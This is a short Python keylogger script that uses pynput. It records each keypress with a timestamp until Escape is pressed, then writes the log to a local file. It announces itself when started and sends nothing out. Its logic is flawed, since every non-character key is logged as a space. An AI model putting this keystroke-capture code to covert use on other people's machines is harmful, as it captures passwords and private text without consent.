from pynput import keyboard
import os
import time
def on_press(key):
    try:
        d = time.strftime("%Y/%m/%d,%H:%M:%S")
        # if key.char == ',':
        #     log.append('Key.comma' + ',' + d + '\n')
        # else:
        #
        log.append(key.char + ',' + d + '\n')
    except AttributeError:
        # if key == keyboard.Key.space:
        log.append('Key.space' + ',' + d + '\n')
        # else:
        #     pass
    if key == keyboard.Key.esc:
        # Stop listener
        exit()


if __name__ == "__main__":
    # Collect events until released
    if not os.path.exists("logs"):
        os.makedirs("logs")
    print("You've started the keylogger. Press your escape key to stop logging.")
    log = []
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("".join(log))
    date = time.strftime("Log_%Y-%m-%d_%H-%M-%S")
    with open('logs/' + date + ".txt", 'w') as file:
        for key in log:
            file.write(str(key))